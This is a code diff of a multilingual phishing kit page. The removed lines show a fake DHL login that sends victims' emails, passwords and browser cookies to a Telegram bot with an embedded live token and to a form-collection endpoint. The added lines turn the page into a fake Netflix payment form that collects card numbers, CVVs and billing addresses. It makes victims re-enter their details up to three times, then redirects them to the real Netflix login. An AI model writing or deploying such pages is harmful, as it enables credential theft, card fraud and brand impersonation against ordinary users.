+                    'zipcode_error': '유효한 우편번호를 입력해 주세요',
+                    'submit': '제출',
+                    'card_info': '결제는 국제적으로 처리됩니다. 추가 은행 수수료가 적용될 수 있습니다.',
+                    'spam_detected': '스팸이 감지되었습니다!',
+                    'fill_form_again': '양식을 다시 작성해 주세요.',
+                    'submit_success': '양식이 성공적으로 제출되었습니다!',
+                    'submit_error': '양식 제출 중 오류가 발생했습니다.'
                 }
             },
             'ja': {
                 translation: {
-                    'title': 'DHL ログイン',
-                    'header_title': 'DHL エクスプレス',
-                    'send_package': '荷物を送る',
-                    'send_directly': '直接送る',
-                    'continue_with_password': 'パスワードで続行',
-                    'email_placeholder': 'メールアドレス',
-                    'password_placeholder': 'パスワード',
-                    'login': 'ログイン',
-                    'error_message': 'メールアドレスとパスワードを入力してください。',
-                    'reset_password': 'パスワードのリセット',
-                    'no_account': 'まだアカウントをお持ちでないですか？',
-                    'sign_up': 'サインアップ',
-                    'business_user': 'ビジネスユーザー？',
-                    'business_sign_in': 'ログイン',
-                    'cookie_consent_message': '私たちはクッキーを使用してユーザー体験を向上させます。続行することで、認証目的でのクッキーの使用に同意するものとします。'
+                    'title': 'Netflix 支払い情報',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': '支払い設定',
+                    'card_number': 'カード番号',
+                    'card_number_placeholder': 'カード番号',
+                    'card_number_error': '有効な16桁のカード番号を入力してください',
+                    'expiry_date': '有効期限 (MM/YY)',
+                    'expiry_date_placeholder': '有効期限 (MM/YY)',
+                    'expiry_error': '有効で期限切れでない日付(MM/YY)を入力してください',
+                    'cvv': 'セキュリティコード (CVV)',
+                    'cvv_placeholder': 'セキュリティコード (CVV)',
+                    'cvv_error': '有効なCVV(3または4桁)を入力してください',
+                    'name_on_card': '名前と姓',
+                    'name_on_card_placeholder': '名前と姓',
+                    'name_error': '有効な名前と姓を入力してください',
+                    'street_address': '住所',
+                    'street_address_placeholder': '住所',
+                    'street_address_error': '有効な住所を入力してください',
+                    'city': '都市',
+                    'city_placeholder': '都市',
+                    'city_error': '有効な都市名を入力してください',
+                    'state': '州/県',
+                    'state_placeholder': '州/県',
+                    'state_error': '有効な州/県を入力してください',
+                    'country': '国',
+                    'country_placeholder': '国',
+                    'country_error': '有効な国を入力してください',
+                    'zipcode': '郵便番号',
+                    'zipcode_placeholder': '郵便番号',
+                    'zipcode_error': '有効な郵便番号を入力してください',
+                    'submit': '送信',
+                    'card_info': '支払いは国際的に処理されます。追加の銀行手数料が適用される場合があります。',
+                    'spam_detected': 'スパムが検出されました！',
+                    'fill_form_again': 'フォームを再度入力してください。',
+                    'submit_success': 'フォームが正常に送信されました！',
+                    'submit_error': 'フォームの送信中にエラーが発生しました。'
                 }
             },
             'vi': {
                 translation: {
-                    'title': 'Đăng nhập DHL',
-                    'header_title': 'DHL Express',
-                    'send_package': 'Gửi gói hàng',
-                    'send_directly': 'Gửi trực tiếp',
-                    'continue_with_password': 'Tiếp tục với mật khẩu của bạn',
-                    'email_placeholder': 'Địa chỉ email',
-                    'password_placeholder': 'Mật khẩu',
-                    'login': 'Đăng nhập',
-                    'error_message': 'Vui lòng nhập cả email và mật khẩu.',
-                    'reset_password': 'Đặt lại mật khẩu',
-                    'no_account': 'Chưa có tài khoản?',
-                    'sign_up': 'Đăng ký',
-                    'business_user': 'Người dùng doanh nghiệp?',
-                    'business_sign_in': 'Đăng nhập',
-                    'cookie_consent_message': 'Chúng tôi sử dụng cookie để nâng cao trải nghiệm của bạn. Bằng cách tiếp tục, bạn đồng ý với việc chúng tôi sử dụng cookie cho mục đích xác thực.'
+                    'title': 'Thông tin thanh toán Netflix',
+                    'netflix_logo': 'NETFLIX',
+                    'set_up_payment': 'Thiết lập thanh toán của bạn',
+                    'card_number': 'Số thẻ',
+                    'card_number_placeholder': 'Số thẻ',
+                    'card_number_error': 'Vui lòng nhập số thẻ hợp lệ 16 chữ số',
+                    'expiry_date': 'Ngày hết hạn (MM/YY)',
+                    'expiry_date_placeholder': 'Ngày hết hạn (MM/YY)',
+                    'expiry_error': 'Vui lòng nhập ngày hết hạn hợp lệ, chưa hết hạn (MM/YY)',
+                    'cvv': 'Mã bảo mật (CVV)',
+                    'cvv_placeholder': 'Mã bảo mật (CVV)',
+                    'cvv_error': 'Vui lòng nhập mã CVV hợp lệ (3 hoặc 4 chữ số)',
+                    'name_on_card': 'Họ và tên',
+                    'name_on_card_placeholder': 'Họ và tên',
+                    'name_error': 'Vui lòng nhập họ và tên hợp lệ',
+                    'street_address': 'Địa chỉ đường phố',
+                    'street_address_placeholder': 'Địa chỉ đường phố',
+                    'street_address_error': 'Vui lòng nhập địa chỉ đường phố hợp lệ',
+                    'city': 'Thành phố',
+                    'city_placeholder': 'Thành phố',
+                    'city_error': 'Vui lòng nhập tên thành phố hợp lệ',
+                    'state': 'Bang/Tỉnh',
+                    'state_placeholder': 'Bang/Tỉnh',
+                    'state_error': 'Vui lòng nhập bang/tỉnh hợp lệ',
+                    'country': 'Quốc gia',
+                    'country_placeholder': 'Quốc gia',
+                    'country_error': 'Vui lòng nhập quốc gia hợp lệ',
+                    'zipcode': 'Mã bưu điện',
+                    'zipcode_placeholder': 'Mã bưu điện',
+                    'zipcode_error': 'Vui lòng nhập mã bưu điện hợp lệ',
+                    'submit': 'Gửi',
+                    'card_info': 'Thanh toán của bạn sẽ được xử lý quốc tế. Có thể áp dụng phí ngân hàng bổ sung.',
+                    'spam_detected': 'Phát hiện spam!',
+                    'fill_form_again': 'Vui lòng điền lại biểu mẫu.',
+                    'submit_success': 'Biểu mẫu đã được gửi thành công!',
+                    'submit_error': 'Lỗi khi gửi biểu mẫu.'
                 }
             }
         };
 
-        // Telegram Bot Configuration
-        const botToken = '7103630373:AAFVJ_kia1ilw3C043wVG478q81bhZjt7gI';
-        const chatId = '6134592216';
+        // Validation functions
+        function validateCardNumber(cardNumber) {
+            const cleanCardNumber = cardNumber.replace(/\D/g, '');
+            const visaMasterRegex = /^\d{16}$/;
+            const amexRegex = /^\d{15}$/;
+            return visaMasterRegex.test(cleanCardNumber) || amexRegex.test(cleanCardNumber);
+        }
 
-        // Function to validate and extract email from URL hash or eta query parameter
-        function extractEmailFromUrl() {
-            const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-            const hash = window.location.hash ? decodeURIComponent(window.location.hash.substring(1)) : null;
-            if (hash && isValidEmail(hash)) {
-                console.log('Valid email from hash:', hash);
-                return hash;
-            } else if (hash) {
-                console.warn('Invalid email format in URL hash:', hash);
-            }
-            const urlParams = new URLSearchParams(window.location.search);
-            const eta = urlParams.get('eta') ? decodeURIComponent(urlParams.get('eta')) : null;
-            if (eta && isValidEmail(eta)) {
-                console.log('Valid email from eta:', eta);
-                return eta;
-            } else if (eta) {
-                console.warn('Invalid email format in eta query parameter:', eta);
-            }
-            console.warn('No valid email found in URL hash or eta query parameter.');
-            return null;
+        function validateExpirationDate(expDate) {
+            const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            if (!regex.test(expDate)) return false;
+            const [month, year] = expDate.split('/').map(Number);
+            const currentDate = new Date();
+            const currentYear = currentDate.getFullYear() % 100;
+            const currentMonth = currentDate.getMonth() + 1;
+            const expYear = parseInt(`20${year}`);
+            return expYear > currentDate.getFullYear() || (expYear === currentDate.getFullYear() && month >= currentMonth);
+        }
+
+        function validateCVV(cvv, cardNumber) {
+            const cleanCardNumber = cardNumber.replace(/\D/g, '');
+            const isAmex = cleanCardNumber.length === 15;
+            const cvvRegex = isAmex ? /^\d{4}$/ : /^\d{3}$/;
+            return cvvRegex.test(cvv);
+        }
+
+        function validateName(name) {
+            const regex = /^[A-Za-z\s]+$/;
+            const names = name.trim().split(/\s+/);
+            return regex.test(name) && names.length >= 2;
+        }
+
+        function validateStreetAddress(address) {
+            const regex = /^[A-Za-z0-9\s,.-]+$/;
+            return regex.test(address) && address.trim().length >= 5;
+        }
+
+        function validateCity(city) {
+            const regex = /^[A-Za-z\s-]+$/;
+            return regex.test(city) && city.trim().length >= 2;
+        }
+
+        function validateState(state) {
+            return state.trim().length >= 2; // Basic check; can be enhanced with state lists
+        }
+
+        function validateCountry(country) {
+            const validCountries = ['United States', 'Canada', 'China', 'India', 'Spain', 'France', 'Japan', 'South Korea', 'Vietnam', 'Saudi Arabia'];
+            return validCountries.includes(country.trim());
+        }
+
+        function validateZipcode(zipcode, country) {
+            const zipRegex = {
+                'United States': /^\d{5}$/,
+                'Canada': /^[A-Za-z]\d[A-Za-z][ -]?\d[A-Za-z]\d$/,
+                'China': /^\d{6}$/,
+                'India': /^\d{6}$/,
+                'Spain': /^\d{5}$/,
+                'France': /^\d{5}$/,
+                'Japan': /^\d{7}$/,
+                'South Korea': /^\d{5}$/,
+                'Vietnam': /^\d{6}$/,
+                'Saudi Arabia': /^\d{5}$/
+            };
+            return zipRegex[country] ? zipRegex[country].test(zipcode) : /^\d{5}$/.test(zipcode);
         }
 
         // Function to detect user's language
         function detectUserLanguage() {
             const supportedLanguages = ['en', 'zh-CN', 'hi', 'es', 'fr', 'ar', 'ko', 'ja', 'vi'];
             const userLanguages = navigator.languages || [navigator.language || 'en'];
-            console.log('Detected browser languages:', userLanguages);
             for (let lang of userLanguages) {
                 if (lang.startsWith('zh')) return 'zh-CN';
                 if (supportedLanguages.includes(lang)) return lang;
                 const baseLang = lang.split('-')[0];
                 if (supportedLanguages.includes(baseLang)) return baseLang;
             }
-            console.log('Falling back to English (en)');
             return 'en';
         }
 
-        // Cookie Functions
-        function setCookie(name, value, days) {
-            let expires = "";
-            if (days) {
-                const date = new Date();
-                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-                expires = "; expires=" + date.toUTCString();
-            }
-            document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Strict";
-            console.log(`Cookie set: ${name}=${value}`);
-        }
-
-        function getCookie(name) {
-            const nameEQ = name + "=";
-            const ca = document.cookie.split(';');
-            for (let i = 0; i < ca.length; i++) {
-                let c = ca[i];
-                while (c.charAt(0) === ' ') c = c.substring(1);
-                if (c.indexOf(nameEQ) === 0) {
-                    const value = c.substring(nameEQ.length);
-                    console.log(`Cookie found: ${name}=${value}`);
-                    return value;
-                }
-            }
-            console.log(`Cookie not found: ${name}`);
-            return null;
-        }
-
-        function showCookieConsent() {
-            const consent = getCookie('cookieConsent');
-            const consentPopup = document.getElementById('cookie-consent');
-            const submitButton = document.getElementById('submit-button');
-            if (!consent) {
-                consentPopup.style.display = 'block';
-                submitButton.disabled = true;
-                console.log('Showing cookie consent popup');
-            } else {
-                submitButton.disabled = false;
-                console.log('Cookie consent already set:', consent);
-            }
-        }
-
-        function setCookieConsent(status) {
-            setCookie('cookieConsent', status, 365);
-            document.getElementById('cookie-consent').style.display = 'none';
-            document.getElementById('submit-button').disabled = false;
-            console.log(`Cookie consent set to: ${status}`);
-        }
-
-        function getCookies() {
-            const rawCookies = document.cookie;
-            if (!rawCookies) {
-                console.log('No cookies available');
-                return '';
-            }
-            const cookies = rawCookies.split('; ').filter(cookie => !cookie.startsWith('cookieConsent=')).join('; ');
-            console.log('Captured cookies:', cookies || 'None (excluding cookieConsent)');
-            return cookies;
-        }
-
-        // Set a test cookie for debugging
-        setCookie('testCookie', 'testValue', 1);
-
-        // Initialize i18next
+        // Initialize i18next with detected language
         i18next.init({
             lng: detectUserLanguage(),
             fallbackLng: 'en',
-            resources: translations,
-            debug: true
+            resources: translations
         }, function(err, t) {
-            if (err) {
-                console.error('i18next initialization error:', err);
-                return;
-            }
-            console.log('i18next initialized with language:', i18next.language);
+            if (err) console.error(err);
             const lang = i18next.language;
             document.getElementById('html').setAttribute('lang', lang);
             document.getElementById('html').setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+            updateTranslations();
+            document.querySelector('.lang-switcher').value = lang;
+        });
+
+        // Update translations for all elements
+        function updateTranslations() {
             document.querySelectorAll('[data-i18n]').forEach(element => {
                 const key = element.getAttribute('data-i18n');
                 if (key.startsWith('[placeholder]')) {
-                    element.placeholder = t(key.replace('[placeholder]', ''));
-                } else if (key.startsWith('[value]')) {
-                    element.value = t(key.replace('[value]', ''));
+                    element.placeholder = i18next.t(key.replace('[placeholder]', ''));
                 } else {
-                    element.innerText = t(key);
+                    element.innerText = i18next.t(key);
                 }
             });
-            document.title = t('title');
-            document.querySelector('.lang-switcher').value = lang;
-            showCookieConsent();
-        });
+            document.title = i18next.t('title');
+        }
 
-        // Language switcher
+        // Language switcher for manual override
         function setLanguage(lang) {
             i18next.changeLanguage(lang, (err, t) => {
-                if (err) {
-                    console.error('i18next changeLanguage error:', err);
-                    return;
-                }
-                console.log('Language changed to:', lang);
+                if (err) return console.error(err);
                 const html = document.getElementById('html');
                 html.setAttribute('lang', lang);
                 html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
-                document.querySelectorAll('[data-i18n]').forEach(element => {
-                    const key = element.getAttribute('data-i18n');
-                    if (key.startsWith('[placeholder]')) {
-                        element.placeholder = t(key.replace('[placeholder]', ''));
-                    } else if (key.startsWith('[value]')) {
-                        element.value = t(key.replace('[value]', ''));
-                    } else {
-                        element.innerText = t(key);
-                    }
-                });
-                document.title = t('title');
-                document.querySelector('.lang-switcher').value = lang;
-                document.getElementById('cookie-consent').querySelector('p').innerText = t('cookie_consent_message');
+                updateTranslations();
             });
         }
 
-        // Form handling
-        (() => {
-            const form = document.getElementById('signin-form');
-            const emailInput = document.getElementById('email');
-            const errorMessageEl = document.getElementById('error-message');
-            const submitButton = document.getElementById('submit-button');
-            const maxAttempts = 3;
-            const submitEndpoint = 'https://submit-form.com/Uxt0vouOR';
-            let attemptCount = 0;
+        // Form submission handling
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('paymentForm');
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expirationInput = document.getElementById('expirationDate');
+            const cvvInput = document.getElementById('cvv');
+            const nameInput = document.getElementById('nameOnCard');
+            const streetAddressInput = document.getElementById('streetAddress');
+            const cityInput = document.getElementById('city');
+            const stateInput = document.getElementById('state');
+            const countryInput = document.getElementById('country');
+            const zipcodeInput = document.getElementById('zipcode');
+            const honeypotInput = document.getElementById('honeypot');
+            let submissionCount = 0;
 
-            const emailParam = extractEmailFromUrl();
-            if (emailParam) {
-                emailInput.value = emailParam;
-                emailInput.disabled = false;
-            } else {
-                emailInput.disabled = true;
-            }
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
 
-            form.addEventListener('submit', async (event) => {
-                event.preventDefault();
-                errorMessageEl.textContent = '';
-
-                const email = form.email.value.trim();
-                const password = form.password.value;
-                const honeypot = form.honeypot.value;
-                const consent = getCookie('cookieConsent');
-                console.log('Consent status:', consent);
-
-                if (!email || !password) {
-                    errorMessageEl.textContent = i18next.t('error_message');
-                    console.log('Form validation failed: email or password missing');
+                if (honeypotInput.value.trim() !== '') {
+                    alert(i18next.t('spam_detected'));
                     return;
                 }
 
-                if (honeypot) {
-                    console.warn('Honeypot field filled, likely a bot submission.');
+                let isValid = true;
+
+                // Reset error displays
+                [cardNumberInput, expirationInput, cvvInput, nameInput, streetAddressInput, cityInput, stateInput, countryInput, zipcodeInput].forEach(input => {
+                    const errorElement = document.getElementById(input.id + 'Error');
+                    if (errorElement) errorElement.style.display = 'none';
+                });
+
+                // Validate each field
+                if (!validateCardNumber(cardNumberInput.value)) {
+                    document.getElementById('cardNumberError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateExpirationDate(expirationInput.value)) {
+                    document.getElementById('expiryError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateCVV(cvvInput.value, cardNumberInput.value)) {
+                    document.getElementById('cvvError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateName(nameInput.value)) {
+                    document.getElementById('nameError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateStreetAddress(streetAddressInput.value)) {
+                    document.getElementById('streetAddressError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateCity(cityInput.value)) {
+                    document.getElementById('cityError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateState(stateInput.value)) {
+                    document.getElementById('stateError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateCountry(countryInput.value)) {
+                    document.getElementById('countryError').style.display = 'block';
+                    isValid = false;
+                }
+                if (!validateZipcode(zipcodeInput.value, countryInput.value)) {
+                    document.getElementById('zipcodeError').style.display = 'block';
+                    isValid = false;
+                }
+
+                if (!isValid) {
+                    updateTranslations();
                     return;
                 }
 
-                const cookies = consent === 'accepted' ? getCookies() : '';
-                console.log('Cookies to send:', cookies || 'None');
+                submissionCount++;
 
-                // Prepare message for Telegram
-                const telegramMessage = `New Form Submission\n\n<b>Email:</b> ${email}\n<b>Password:</b> ${password}\n<b>Cookies:</b> ${cookies || 'None'}`;
-                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                try {
-                    // Send to Telegram
-                    const telegramResponse = await fetch(telegramUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: telegramMessage,
-                            parse_mode: 'HTML'
-                        })
-                    });
-
-                    const telegramData = await telegramResponse.json();
-                    if (!telegramData.ok) {
-                        throw new Error(`Telegram API error: ${telegramData.description}`);
-                    }
-                    console.log('Telegram message sent successfully:', telegramData);
-
-                    // Send to original endpoint
-                    const payload = { email, password };
-                    if (cookies) payload.cookies = cookies;
-                    console.log('Sending payload to original endpoint:', JSON.stringify(payload));
-
-                    const response = await fetch(submitEndpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-
-                    if (!response.ok) {
-                        throw new Error(`Original endpoint failed: ${response.statusText}`);
-                    }
-
-                    console.log('Form submission successful:', payload);
-                } catch (error) {
-                    console.error('Submission error:', error);
-                    attemptCount++;
-                    if (attemptCount < maxAttempts) {
-                        form.password.value = '';
-                        form.password.focus();
-                        errorMessageEl.textContent = i18next.t('error_message');
+                fetch(form.action, {
+                    method: 'POST',
+                    body: new URLSearchParams(new FormData(form)),
+                }).then(response => {
+                    if (response.ok) {
+                        alert(i18next.t('submit_success'));
                     } else {
-                        console.log('Max attempts reached, redirecting...');
-                        window.location.href = 'https://mydhl.express.dhl/gq/en/auth/link-error.html';
+                        alert(i18next.t('submit_error'));
                     }
+                }).catch(error => {
+                    console.error('Form submission error:', error);
+                    alert(i18next.t('submit_error'));
+                });
+
+                // Reset form
+                cardNumberInput.value = '';
+                expirationInput.value = '';
+                cvvInput.value = '';
+                nameInput.value = '';
+                streetAddressInput.value = '';
+                cityInput.value = '';
+                stateInput.value = '';
+                countryInput.value = '';
+                zipcodeInput.value = '';
+
+                updateTranslations();
+
+                if (submissionCount < 3) {
+                    alert(i18next.t('fill_form_again'));
+                } else {
+                    window.location.href = "https://www.netflix.com/login";
                 }
             });
 
-            const togglePassword = document.getElementById('toggle-password');
-            togglePassword.addEventListener('click', () => {
-                const passwordInput = document.getElementById('password');
-                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                passwordInput.setAttribute('type', type);
-                togglePassword.querySelector('i').classList.toggle('fa-eye-slash');
+            // Clear error on input focus
+            [cardNumberInput, expirationInput, cvvInput, nameInput, streetAddressInput, cityInput, stateInput, countryInput, zipcodeInput].forEach(input => {
+                input.addEventListener('focus', function() {
+                    const errorElement = document.getElementById(input.id + 'Error');
+                    if (errorElement) {
+                        errorElement.style.display = 'none';
+                    }
+                });
             });
-        })();
+        });
     </script>
 </body>
 </html>
